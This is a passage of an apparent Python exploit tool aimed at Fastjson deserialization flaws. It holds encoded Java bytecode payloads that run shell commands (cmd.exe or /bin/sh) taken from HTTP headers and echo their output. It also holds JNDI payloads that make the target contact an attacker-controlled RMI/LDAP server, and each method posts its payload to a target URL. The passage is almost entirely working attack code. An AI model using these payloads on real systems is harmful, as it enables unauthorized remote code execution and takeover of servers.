TwEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAFEBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUwBUCgBSAFUBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVwEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABZAFoKAFgAWwEAEGphdmEvbGFuZy9TdHJpbmcHAF0BAAMoKVYMACMAXwoABABgAQAQamF2YS9sYW5nL1RocmVhZAcAYgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAZABlCgBjAGYBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGgAaQoAYwBqAQAHdGhyZWFkcwgAbAwAQwBECgACAG4BABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBwAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAByAHMKAGMAdAEABGV4ZWMIAHYBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAeAB5CgBeAHoBAARodHRwCAB8AQAGdGFyZ2V0CAB+AQASamF2YS9sYW5nL1J1bm5hYmxlBwCAAQAGdGhpcyQwCACCAQAHaGFuZGxlcggAhAEABmdsb2JhbAgAhgEACnByb2Nlc3NvcnMIAIgBAA5qYXZhL3V0aWwvTGlzdAcAigEABHNpemUBAAMoKUkMAIwAjQsAiwCOAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABZAJALAIsAkQEAA3JlcQgAkwEAC2dldFJlc3BvbnNlCACVAQAJZ2V0SGVhZGVyCACXAQAIVGVzdGVjaG8IAJkBAAdpc0VtcHR5AQADKClaDACbAJwKAF4AnQEACXNldFN0YXR1cwgAnwEACWFkZEhlYWRlcggAoQEAB1Rlc3RjbWQIAKMBAAdvcy5uYW1lCAClAQAQamF2YS9sYW5nL1N5c3RlbQcApwEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKkAqgoAqACrAQALdG9Mb3dlckNhc2UMAK0AcwoAXgCuAQAGd2luZG93CACwAQAHY21kLmV4ZQgAsgEAAi9jCAC0AQAHL2Jpbi9zaAgAtgEAAi1jCAC4AQARamF2YS91dGlsL1NjYW5uZXIHALoBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALwBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjAL4KAL0AvwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DADBAMIKAL0AwwEAEWphdmEvbGFuZy9Qcm9jZXNzBwDFAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxwDICgDGAMkBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAywoAuwDMAQACXEEIAM4BAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMANAA0QoAuwDSAQAEbmV4dAwA1ABzCgC7ANUBAAhnZXRCeXRlcwEABCgpW0IMANcA2AoAXgDZDAAHAAgKAAIA2wEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMAN0A3goAqADfAQATamF2YS91dGlsL0hhc2h0YWJsZQcA4QEACHRvU3RyaW5nDADjAHMKAOIA5AEAE1tMamF2YS9sYW5nL1N0cmluZzsHAOYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDoCgDpAGAAIQACAOkAAAAAAAMACgAHAAgAAgA+AAABLwAIAAUAAAD2Egq4ABBOLbYAFE0tEhYGvQAMWQMSGFNZBLIAHlNZBbIAHlO2ACIsBr0ABFkDK1NZBLsAGlkDtwAmU1kFuwAaWSu+twAmU7YALFcqtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAI06BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAEg6BBI5uAAQTi0SOwS9AAxZAxIYU7YAIi0EvQAEWQMrU7YALE0qtgAwEjIEvQAMWQMtU7YANSoEvQAEWQMsU7YALFenAAOxAAIAAABoAGsANwAAAGgAsAA9AAEAQgAAABcAA/cAawcAN/cARAcAPf0ARAcABAcADAA/AAAABAABAEEACgBDAEQAAgA+AAAAfgADAAUAAAA/AU0qtgAwTqcAGS0rtgBITacAFqcAADoELbYATU6nAAMtEgSm/+csAaYADLsASlkrtwBQvywEtgBWLCq2AFywAAEACgATABYASgABAEIAAAAlAAb9AAoHAFgHAAwI/wACAAQHAAQHAF4HAFgHAAwAAQcASgkFDQA/AAAABAABAEEAAQAjAF8AAgA+AAADNgAIAA0AAAI/KrcA6gM2BLgAZ7YAaxJtuABvwABxOgUDNgYVBhkFvqICHxkFFQYyOgcZBwGmAAanAgkZB7YAdU4tEne2AHuaAAwtEn22AHuaAAanAe4ZBxJ/uABvTCvBAIGaAAanAdwrEoO4AG8ShbgAbxKHuABvTKcACzoIpwHDpwAAKxKJuABvwACLOgkDNgoVChkJuQCPAQCiAZ4ZCRUKuQCSAgA6CxkLEpS4AG9MK7YAMBKWA70ADLYANSsDvQAEtgAsTSu2ADASmAS9AAxZAxJeU7YANSsEvQAEWQMSmlO2ACzAAF5OLQGlAAottgCemQAGpwBYLLYAMBKgBL0ADFkDsgAeU7YANSwEvQAEWQO7ABpZEQDItwAmU7YALFcstgAwEqIFvQAMWQMSXlNZBBJeU7YANSwFvQAEWQMSmlNZBC1TtgAsVwQ2BCu2ADASmAS9AAxZAxJeU7YANSsEvQAEWQMSpFO2ACzAAF5OLQGlAAottgCemQAGpwCNLLYAMBKgBL0ADFkDsgAeU7YANSwEvQAEWQO7ABpZEQDItwAmU7YALFcSprgArLYArxKxtgB7mQAYBr0AXlkDErNTWQQStVNZBS1TpwAVBr0AXlkDErdTWQQSuVNZBS1TOgwsuwC7WbsAvVkZDLcAwLYAxLYAyrcAzRLPtgDTtgDWtgDauADcBDYELQGlAAottgCemQAIFQSaAAanABAsuADgtgDltgDauADcFQSZAAanAAmECgGn/lwVBJkABqcACYQGAaf937EAAQBfAHAAcwBBAAEAQgAAAN0AGf8AGgAHBwACAAAAAQcAcQEAAPwAFwcAY/8AFwAIBwACAAAHAF4BBwBxAQcAYwAAAv8AEQAIBwACBwAEAAcAXgEHAHEBBwBjAABTBwBBBP8AAgAIBwACBwAEAAcAXgEHAHEBBwBjAAD+AA0ABwCLAf8AYwAMBwACBwAEBwAEBwBeAQcAcQEHAGMABwCLAQcABAAAAvsAVC4C+wBNUQcA5ykLBAIMB/8ABQALBwACBwAEAAcAXgEHAHEBBwBjAAcAiwEAAP8ABwAIBwACAAAAAQcAcQEHAGMAAPoABQA/AAAABAABAEEAAQAFAAAAAgAG"
            ],
            "_name": "lightless",
            "_tfactory": {
            },
            "_outputProperties": {
            }
        }
        data = json.dumps(data)
        try:
            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def fastjson_1224_3_exp(self, cmd):
        vul_name = "Fastjson: VER-1224-3"
        headers = {
            'User-Agent': self.ua,
            'Content-Type': 'application/json',
            'cmd': cmd,
            'Connection': 'close'
        }
        data = '{{"@type": "com.alibaba.fastjson.JSONObject","x":{"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"}}: "x"}'
        try:
            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def fastjson_1247_exp(self, rmi_ldap):
        vul_name = "Fastjson: VER-1247"
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
        data = {
            "a": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            },
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": rmi_ldap,
                "autoCommit": True
            }
        }
        data = json.dumps(data)
        try:
            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            r = "Command Executed Successfully (But No Echo)"
            verify.exploit_print(r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def fastjson_1262_exp(self, rmi_ldap):
        vul_name = "Fastjson: VER-1262"
        headers = {'User-Agent': self.ua, 'Content-Type': "application/json"}
        data = {
            "@type": "org.apache.xbean.propertyeditor.JndiConverter",
            "AsText": rmi_ldap
        }
        data = json.dumps(data)
        try:
            request = requests.post(self.url, data=data, headers=headers, timeout=self.timeout, verify=False)
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            r = "Command Executed Successfully (But No Echo)"
            verify.exploit_print(r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

